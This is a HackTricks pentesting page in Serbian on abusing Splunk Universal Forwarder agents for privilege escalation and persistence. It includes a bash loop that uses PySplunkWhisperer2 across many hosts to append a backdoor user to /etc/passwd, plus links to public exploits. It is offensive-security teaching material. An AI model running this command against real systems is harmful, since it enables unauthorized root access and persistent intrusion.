# Splunk LPE i Persistencija

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

Ako **enumerišete** mašinu **interno** ili **eksterno** i pronađete **Splunk koji radi** (port 8090), ako srećom znate neke **validne akreditive** možete **zloupotrebiti Splunk servis** da **izvršite shell** kao korisnik koji pokreće Splunk. Ako ga pokreće root, možete eskalirati privilegije na root.

Takođe, ako ste **već root i Splunk servis ne sluša samo na localhost**, možete **ukrasti** **datoteku** sa **lozinkama** **iz** Splunk servisa i **provaliti** lozinke, ili **dodati nove** akreditive. I održati persistenciju na hostu.

Na prvoj slici ispod možete videti kako izgleda Splunkd web stranica.

## Pregled Eksploatacije Splunk Universal Forwarder Agenta

Za više detalja proverite post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo sažetak:

**Pregled Eksploatacije:**
Eksploatacija koja cilja Splunk Universal Forwarder Agenta (UF) omogućava napadačima sa lozinkom agenta da izvrše proizvoljan kod na sistemima koji pokreću agenta, potencijalno kompromitujući celu mrežu.

**Ključne Tačke:**
- UF agent ne validira dolazne konekcije ili autentičnost koda, što ga čini ranjivim na neovlašćeno izvršavanje koda.
- Uobičajene metode sticanja lozinki uključuju lociranje u mrežnim direktorijumima, deljenim datotekama ili internim dokumentima.
- Uspešna eksploatacija može dovesti do pristupa na SISTEM ili root nivou na kompromitovanim hostovima, eksfiltraciju podataka i dalju infiltraciju u mrežu.

**Izvršenje Eksploatacije:**
1. Napadač dobija lozinku UF agenta.
2. Koristi Splunk API za slanje komandi ili skripti agentima.
3. Moguće akcije uključuju ekstrakciju datoteka, manipulaciju korisničkim nalozima i kompromitaciju sistema.

**Uticaj:**
- Potpuna kompromitacija mreže sa SISTEM/root nivoom dozvola na svakom hostu.
- Potencijal za onemogućavanje logovanja kako bi se izbegla detekcija.
- Instalacija backdoora ili ransomware-a.

**Primer Komande za Eksploataciju:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Iskoristivi javni eksploiti:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Zloupotreba Splunk upita

**Za više detalja pogledajte post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
